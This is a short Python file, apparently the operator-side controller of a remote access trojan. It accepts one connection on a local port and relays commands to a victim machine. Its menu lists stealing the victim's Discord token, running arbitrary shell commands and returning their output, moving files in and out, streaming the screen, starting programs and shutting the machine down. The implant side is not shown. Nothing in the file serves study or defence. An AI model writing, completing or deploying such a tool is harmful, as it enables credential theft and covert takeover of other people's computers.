import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('127.0.0.1', 1234))
s.listen(1)

conn, addr = s.accept()
print(f'Client connected: {addr}')

while True:
    cmd = input('What you would do: ')
    
    if cmd == 'exit':
        break
    
    if cmd == 'help':
        print('''
              All commands:
                exit - exit the program
                help - show this message
                discord_token - get the Discord token
                shutdown - shutdown the computer
                restart - restart the computer
                sleep - sleep the computer
                put - put a file on the computer
                get - get a file from the computer
                cmd - run a command on the computer
                stream - stream the computer's screen
                start - start a program''')
        conn.send(cmd.encode())

    if cmd == 'discord_token':
        conn.send(cmd.encode())
    
    elif cmd == 'shutdown':
        conn.send(cmd.encode())
    
    elif cmd == 'restart':
        conn.send(cmd.encode())

    elif cmd == 'sleep':
        conn.send(cmd.encode())

    elif cmd == 'put':
        conn.send(cmd.encode())
    
    elif cmd == 'get':
        conn.send(cmd.encode())
    
    elif cmd == 'cmd':
        conn.send(cmd.encode())
        cmd = input('Command: ').encode()
        if not cmd:
            conn.send('cls'.encode())
        conn.send(cmd)
        answer = conn.recv(1024).decode()
        print(f'Output: \n{answer}')
    
    elif cmd == 'stream':
        conn.send(cmd.encode())
    
    elif cmd == 'start':
        conn.send(cmd.encode())
    
    else:
        print('Invalid command')

conn.close()